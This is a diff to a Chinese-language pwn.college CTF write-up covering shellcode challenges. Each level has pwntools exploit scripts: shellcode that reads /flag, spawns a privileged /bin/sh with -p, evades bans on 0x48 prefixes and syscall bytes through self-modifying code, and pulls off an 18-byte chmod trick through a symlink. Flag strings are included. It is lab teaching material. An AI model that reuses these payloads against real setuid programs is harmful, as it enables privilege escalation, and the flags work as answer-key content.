@@ -190,6 +190,24 @@ if __name__ == "__main__":
     main()
 ```
 
+还可以用 pwntools 的 shellcraft 来完成：
+
+```python
+def construct_payload():
+    shellcode = shellcraft.cat("/flag")
+
+    return asm(shellcode)
+```
+
+如果要 shell 的话可以这样写，`-p` 参数确保使用真实 `uid`、`gid` 启动 `/bin/sh`：
+
+```python
+def construct_payload():
+    shellcode = shellcraft.execve("/bin/sh", ["/bin/sh", "-p"], 0)
+
+    return asm(shellcode)
+```
+
 ### Flag
 
 Flag: `pwn.college{s4taPKpK1SzfB3gWK--PDuB4Xwx.01NxIDL5cTNxgzW}`
@@ -284,7 +302,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 ```python
 #!/usr/bin/python3
 
-from pwn import ELF, asm, context, gdb, log, pause, process, remote, shellcraft
+from pwn import ELF, asm, context, gdb, log, pause, process, remote
 
 context(log_level="debug", terminal="kitty")
 
@@ -318,12 +336,13 @@ def send_payload(target, payload):
         log.exception(f"An error occurred while sending payload: {e}")
 
 
-def construct_payload(sled_length):
-    nop = asm(shellcraft.nop())
-
-    shellcode = nop * sled_length
-    shellcode += asm(
+def construct_payload():
+    shellcode = asm(
         """
+    .rept 0x7ff
+        nop
+    .endr
+
     mov rax, 0x67616c662f
     push rax
     lea rdi, [rsp]
@@ -362,7 +381,7 @@ def attack(target, payload):
 def main():
     try:
         target = launch()
-        payload = construct_payload(0x7FF)
+        payload = construct_payload()
 
         if attack(target, payload):
             log.success("Success! Exiting...")
@@ -375,6 +394,14 @@ def main():
 
 if __name__ == "__main__":
     main()
+```
+
+```python
+def construct_payload(sled_length):
+    shellcode = shellcraft.nop() * sled_length
+    shellcode += shellcraft.cat("/flag")
+
+    return asm(shellcode)
 ```
 
 ### Flag
@@ -560,6 +587,15 @@ if __name__ == "__main__":
     main()
 ```
 
+pwntools 自动生成的代码已经避免了 `\x00`，非常方便～
+
+```python
+def construct_payload():
+    shellcode = shellcraft.cat("/flag")
+
+    return asm(shellcode)
+```
+
 ### Flag
 
 Flag: `pwn.college{gZQWA0hDKCz5Xn8KrcsIiwIX2aZ.0VOxIDL5cTNxgzW}`
@@ -640,6 +676,8 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 ```
 
 显然，这次不允许我们使用 64-bit 汇编写 shellcode。Why？Cuz 64-bit 汇编指令本质上就是 32-bit 汇编的拓展，大多数指令都以前缀 `0x48` 开始。easy peasy!
+
+`push`、`pop` 指令没有 `0x48` 前缀，可以正常使用。
 
 ### Exploit
 
@@ -737,6 +775,36 @@ if __name__ == "__main__":
     main()
 ```
 
+这里再提供一种写法：
+
+```asm
+.global _start
+.intel_syntax noprefix
+
+_start:
+  push 0x2f
+  mov dword ptr [rsp + 1], 0x67616c66
+  push rsp
+  pop rdi
+  xor esi, esi
+  xor edx, edx
+  mov al, 0x2
+  syscall
+
+  mov edi, 0x1
+  mov esi, eax
+  xor edx, edx
+  mov r10, 0x1000
+  mov al, 0x28
+  syscall
+
+  xor edi, edi
+  mov al, 0x3c
+  syscall
+```
+
+由于这题只是不想让我们用 64-bit 的指令，所以我们不能简单的通过 pwntools 生成 32-bit 指令来解决。这样生成出来的指令无法执行，我估计是内存对齐问题导致？因为这个程序本生是 amd64 的。
+
 ### Flag
 
 Flag: `pwn.college{wqf2fgp7CVvoI3yhbzzsqtw5OC3.0FMyIDL5cTNxgzW}`
@@ -822,11 +890,11 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-不让出现系统调用指令的机器码，绕过方法 very ez 啊，请看 exp。
+不让出现系统调用指令的机器码，绕过方法非常 ez 啊，请看 exp。
 
 ### Exploit
 
-```python
+```python ins={49-50, 59-60}
 #!/usr/bin/python3
 
 from pwn import ELF, asm, context, gdb, log, pause, process, remote
@@ -864,33 +932,32 @@ def send_payload(target, payload):
 
 
 def construct_payload():
-    shellcode = asm(
-        """
-    mov rdi, 0x67616c662f
-    push rdi
-    lea rdi, [rsp]
-    xor rsi, rsi
-    xor rdx, rdx
-    mov rax, 0x2
+    shellcode = """
+    /* push b'/flag\x00' */
+    mov rax, 0x101010101010101
+    push rax
+    mov rax, 0x101010101010101 ^ 0x67616c662f
+    xor [rsp], rax
+    /* call open('rsp', 'O_RDONLY', 'rdx') */
+    push 2 /* 2 */
+    pop rax
+    mov rdi, rsp
+    xor esi, esi /* O_RDONLY */
     inc byte ptr [rip + 1]
     .byte 0x0f, 0x04
-
-    mov rdi, 0x1
+    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
+    mov r10d, 0x7fffffff
     mov rsi, rax
-    xor rdx, rdx
-    mov r10, 0x1000
-    mov rax, 0x28
+    push 40 /* 0x28 */
+    pop rax
+    push 1
+    pop rdi
+    cdq /* rdx=0 */
     inc byte ptr [rip + 1]
     .byte 0x0f, 0x04
+    """
 
-    dec rdi
-    mov rax, 0x3c
-    inc byte ptr [rip + 1]
-    .byte 0x0f, 0x04
-        """
-    )
-
-    return shellcode
+    return asm(shellcode)
 
 
 def attack(target, payload):
@@ -1056,36 +1123,33 @@ def send_payload(target, payload):
 
 
 def construct_payload(sled_length):
-    nop = asm(shellcraft.nop())
-
-    shellcode = nop * sled_length
-    shellcode += asm(
-        """
-    mov rdi, 0x67616c662f
-    push rdi
-    lea rdi, [rsp]
-    xor rsi, rsi
-    xor rdx, rdx
-    mov rax, 0x2
+    shellcode = shellcraft.nop() * sled_length
+    shellcode += """
+    /* push b'/flag\x00' */
+    mov rax, 0x101010101010101
+    push rax
+    mov rax, 0x101010101010101 ^ 0x67616c662f
+    xor [rsp], rax
+    /* call open('rsp', 'O_RDONLY', 'rdx') */
+    push 2 /* 2 */
+    pop rax
+    mov rdi, rsp
+    xor esi, esi /* O_RDONLY */
     inc byte ptr [rip + 1]
     .byte 0x0f, 0x04
-
-    mov rdi, 0x1
+    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
+    mov r10d, 0x7fffffff
     mov rsi, rax
-    xor rdx, rdx
-    mov r10, 0x1000
-    mov rax, 0x28
+    push 40 /* 0x28 */
+    pop rax
+    push 1
+    pop rdi
+    cdq /* rdx=0 */
     inc byte ptr [rip + 1]
     .byte 0x0f, 0x04
+    """
 
-    dec rdi
-    mov rax, 0x3c
-    inc byte ptr [rip + 1]
-    .byte 0x0f, 0x04
-        """
-    )
-
-    return shellcode
+    return asm(shellcode)
 
 
 def attack(target, payload):
@@ -1208,7 +1272,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 ```python
 #!/usr/bin/python3
 
-from pwn import ELF, asm, context, gdb, log, pause, process, remote
+from pwn import ELF, asm, context, gdb, log, process, remote, shellcraft
 
 context(log_level="debug", terminal="kitty")
 
@@ -1238,53 +1302,44 @@ def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
 def send_payload(target, payload):
     try:
         target.send(payload)
+        target.recvall(timeout=5)
     except Exception as e:
         log.exception(f"An error occurred while sending payload: {e}")
 
 
 def construct_payload():
-    shellcode = asm(
-        """
-        mov rdi, 0x67616c662f
-        push rdi
-        lea rdi, [rsp]
-        xor rsi, rsi
-        xor rdx, rdx
-        mov rax, 0x2
-        syscall
-        push rax
+    shellcode = shellcraft.open("/flag")
+    shellcode += """
+    /* push out_fd */
+    push rax
+    """
+    shellcode += shellcraft.open("./flag", "O_WRONLY | O_CREAT", 0o0644)
+    shellcode += """
+    /* sendfile('rax', '[rsp+8]', 0, 0x1000) */
+    mov rdi, rax
+    mov rsi, [rsp+0x8]
+    xor rdx, rdx
+    mov r10, 0x1000
+    mov rax, SYS_sendfile
+    syscall
+    """
+    shellcode += shellcraft.exit(0)
 
-        mov rdi, 0x67616c662f2e
-        push rdi
-        lea rdi, [rsp]
-        mov rsi, 0x41
-        mov rdx, 0644
-        mov rax, 0x2
-        syscall
-
-        mov rdi, rax
-        mov rsi, [rsp+8]
-        xor rdx, rdx
-        mov r10, 0x1000
-        mov rax, 0x28
-        syscall
-
-        dec rdi
-        mov rax, 0x3c
-        syscall
-        """
-    )
-
-    return shellcode
+    return asm(shellcode)
 
 
 def attack(target, payload):
+    send_payload(target, payload)
+
     try:
-        send_payload(target, payload)
+        with open("./flag", "r") as file:
+            content = file.read()
 
-        response = target.recvall(timeout=5)
-
-        return b"pwn.college{" in response
+            log.success(content)
+    except FileNotFoundError:
+        log.error("The file './flag' does not exist.")
+    except PermissionError:
+        log.error("Permission denied to read './flag'.")
     except Exception as e:
         log.exception(f"An error occurred while performing attack: {e}")
 
@@ -1294,11 +1349,163 @@ def main():
         target = launch()
         payload = construct_payload()
 
-        if attack(target, payload):
-            log.success("Success! Exiting...")
+        attack(target, payload)
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
 
-            pause()
-            exit()
+
+if __name__ == "__main__":
+    main()
+```
+
+其实这题用 `chmod` 写起来更简单一点呢。
+
+### Flag
+
+Flag: `pwn.college{Y3UgyYnfUmoR24PWDDkCs1W8h92.01MyIDL5cTNxgzW}`
+
+## Level 8
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Write and execute shellcode to read the flag, but you only get 18 bytes.
+
+### Write-up
+
+```c ins={43-48} del={34, 39, 53} collapse={1-30}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  size_t v3; // rax
+  size_t v4; // rax
+  int fd; // [rsp+2Ch] [rbp-14h]
+  const char **i; // [rsp+30h] [rbp-10h]
+  const char **j; // [rsp+38h] [rbp-8h]
+
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts(
+    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
+  puts(
+    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
+  puts(
+    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
+  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
+  for ( fd = 3; fd <= 9999; ++fd )
+    close(fd);
+  for ( i = argv; *i; ++i )
+  {
+    v3 = strlen(*i);
+    memset((void *)*i, 0, v3);
+  }
+  for ( j = envp; *j; ++j )
+  {
+    v4 = strlen(*j);
+    memset((void *)*j, 0, v4);
+  }
+  shellcode = mmap((void *)0x205B4000, 0x1000uLL, 7, 34, 0, 0LL);
+  if ( shellcode != (void *)542851072 )
+    __assert_fail("shellcode == (void *)0x205b4000", "/challenge/babyshell-level-8.c", 0x62u, "main");
+  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x205B4000);
+  puts("Reading 0x12 bytes from stdin.\n");
+  shellcode_size = read(0, shellcode, 0x12uLL);
+  if ( !shellcode_size )
+    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-8.c", 0x67u, "main");
+  puts("Removing write permissions from first 4096 bytes of shellcode.\n");
+  if ( mprotect(shellcode, 0x1000uLL, 5) )
+    __assert_fail(
+      "mprotect(shellcode, 4096, PROT_READ|PROT_EXEC) == 0",
+      "/challenge/babyshell-level-8.c",
+      0x6Au,
+      "main");
+  puts("This challenge is about to execute the following shellcode:\n");
+  print_disassembly(shellcode, shellcode_size);
+  puts(&byte_251D);
+  puts("Executing shellcode!\n");
+  ((void (*)(void))shellcode)();
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+这题在读取数据大小上做了限制，只允许读入 18 bytes。并且读完后把 `buf` 的写权限移除了，因此我们不能通过类似 `read` 的这种 shellcode 把再读数据到别的地方之类的。`execve` 肯定也不可能了，明显会超过 18 bytes。这时候我们发现 `chmod` 是一个很不错的候选，但是不能直接对 `/flag` 使用 `chmod`，不然还是会超。不过既然超的原因是文件名太长，那我们不妨试试建立一个名称短一点的软链接，对软链接进行操作。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, asm, context, gdb, log, os, process, remote
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyshell-level-8"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+        target.recvall(timeout=5)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    shellcode = shellcraft.chmod("f", 0o4)
+
+    return asm(shellcode)
+
+
+def attack(target, payload):
+    os.system("ln -s /flag f")
+    send_payload(target, payload)
+
+    try:
+        with open("./f", "r") as file:
+            content = file.read()
+
+            log.success(content)
+    except FileNotFoundError:
+        log.error("The file './f' does not exist.")
+    except PermissionError:
+        log.error("Permission denied to read './f'.")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch()
+        payload = construct_payload()
+
+        attack(target, payload)
     except Exception as e:
         log.exception(f"An error occurred in main: {e}")
 
@@ -1309,4 +1516,4 @@ if __name__ == "__main__":
 
 ### Flag
 
-Flag: `pwn.college{Y3UgyYnfUmoR24PWDDkCs1W8h92.01MyIDL5cTNxgzW}`
+Flag: `pwn.college{swqZOtc9CdQUIFCMwrec4E5WBCi.0FNyIDL5cTNxgzW}`
